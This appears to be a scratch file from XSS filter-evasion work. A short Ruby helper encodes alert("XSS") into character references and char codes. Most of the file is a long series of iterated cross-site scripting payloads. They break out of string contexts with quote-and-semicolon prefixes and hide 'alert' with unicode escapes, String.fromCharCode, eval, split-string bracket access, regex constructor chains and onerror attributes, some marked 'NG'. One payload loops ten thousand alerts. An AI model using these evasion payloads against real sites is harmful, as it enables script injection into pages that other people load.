
s = 'alert("XSS");'
bs = []
s.each_char do |e|
  bs << "&#" + e.ord.to_s(16) + ";"
end
puts bs.join("")

__END__


s = 'alert("XSS");'

bs = []
s.each_char do |e|
  bs << e.ord
end

puts bs.join(",")


__END__

1: ";\u0061lert("\u0058SS");//
2: \";eval(String.fromCharCode(97,108,101,114,116,40,34,88,83,83,34,41,59));//
3: ',1,2);window['al'+'ert']('X'+'S'+'S');//


1: ";\u0061lert("\u0058SS");//
2: \";a\u006cert('X\u0053S');//
3: ',1,2);window['al'+'ert']('X'+'S'+'S');//

";\u0061lert("\u0058SS");//
\";\u0061\u006cert('X\u0053S');//
',1,2);al\u0065rt('\u0058\u0053\u0053');//

";\u0061lert("\u0058SS");//
\";\u0061\u006cert('\u0058\u0053S');//
',1,2);\u0061\u006c\u0065rt('\u0058\u0053\u0053');//

";\u0061lert("\u0058SS");//
\";eval('alert00000'.slice(0,5)+String.fromCharCode(40,34,88,83,83,34,41,59));//
',1,2);window['Xalert'.substr(1)]('YXSS'.substr(1));//
",4);}alert('XSS');//

";\u0061lert("\u0058SS");//
\";eval('alert00000'.slice(0,5)+String.fromCharCode(40,34,88,83,83,34,41,59));//
',1,2);window['Xalert'.substring(1)]('YXSS'.substring(1));//
",4);}alert('XSS');//

// NG
";\u0061lert("\u0058SS");//
\";eval('alert00000'.slice(0,5)+String.fromCharCode(40,34,88,83,83,34,41,59));//
',1,2);window['Xalert'.substring(1)]('YXSS'.substring(1));//
",4);}/z/['constructor']['constructor']('Xalert(\u0027XSS\u0027)'.substr(1))();//

// NG
";\u0061lert("\u0058SS");//
\";window['Xalert'.substring(1)]('YXSS'.substring(1));//
',2,2);eval('YYalert00000'.slice(2,9-2)+String.fromCharCode(40,34,88,83,83,34,43-2,59));//
",4);}/z/['constructor']['constructor']('ZZZalert(\u0027XSS\u0027)'.substr(3))();//

";\u0061lert("\u0058SS");//
\";window['Xalert'.substring(1)]('YXSS'.substring(1));//
',3,3);eval('YYYalert00000'.slice(3,0xb-3)+String.fromCharCode(40,34,88,83,83,34,44-3,59));//
",4);}/z/['constructor']['constructor']('ZZalert(\u0027XSS\u0027)'.substr(2))();//

";\u0061lert("\u0058SS");//
\";window['Xalert'.substring(1)]('YXSS'.substring(1));//
',5,5);eval('YYYYYalert00000'.slice(5,0xf-5)+String.fromCharCode(40,34,88,83,83,34,46-5,59));//
",2);}/z/['constructor']['constructor']('ZZalert(\u0027XSS\u0027)'.substr(2))();//


";\u0061lert("\u0058SS");//
\";window['Xalert'.substring(1)]('YXSS'.substring(1));//
',5,5);eval('YYYYYalert00000'.slice(5,0xf-5)+String.fromCharCode(40,34,88,83,83,34,46-5,59));//
",6);}/z/['constructor']['constructor']('ZZZZZZalert(\u0027XSS\u0027)'.substr(6))();//




";for(i=0;i<10000;i++){alert('XSS');};//



\u0022);//


%3cscript%3ealert('XSS')%3c/script%3e



";/z/['constructor']['constructor']('alert(\'XSS\')')();//
";/z/['constructor']['constructor']('Xalert(\u0027XSS\u0027)'.substring(1))();//

\u0027


3: ',1,2);window['al'+'ert']('X'+'S'+'S');//

";\u0061lert("\u0058SS");//


',1,2);window['al'+'ert']('X'+'S'+'S');//


',1,2);eval(String.fromCharCode(98-1,109-1,102-1,115-1,117-1,41-1,35-1,89-1,84-1,84-1,35-1,42-1,60-1));//

\";eval(String.fromCharCode(97,108,101,114,116,40,34,88,83,83,34,41,59));//

";/a/['c'+'o'+'n'+'s'+'t'+'r'+'u'+'c'+'t'+'o'+'r']['c'+'o'+'n'+'s'+'t'+'r'+'u'+'c'+'t'+'o'+'r']('a'+'l'+'e'+'r'+'t'+'('+'\''+'X'+'S'+'S'+'\''+')')();//

";z=/XSS/;alert(z.source);//


";eval("&#61;&#6c;&#65;&#72;&#74;&#28;&#22;&#58;&#53;&#53;&#22;&#29;&#3b;");//


";window['al'+'ert']('X'+'S'+'S');//






",1,2);window['al'+'ert']('X'+'S'+'S');//



\"onerror=window['al'+'ert'](1)
&quot;>,1,2);window['al'+'ert'](1);//